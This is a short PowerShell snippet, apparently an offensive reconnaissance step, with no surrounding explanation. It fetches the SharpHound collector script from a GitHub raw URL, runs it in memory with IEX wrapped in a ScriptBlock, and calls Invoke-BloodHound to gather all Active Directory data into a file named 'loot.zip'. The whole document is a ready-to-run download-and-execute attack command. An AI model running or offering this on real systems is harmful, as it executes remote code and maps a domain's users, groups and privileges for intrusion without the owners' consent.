$code = @'
IEX (([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'))
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
'@
$sb = [ScriptBlock]::Create($code)
& $sb
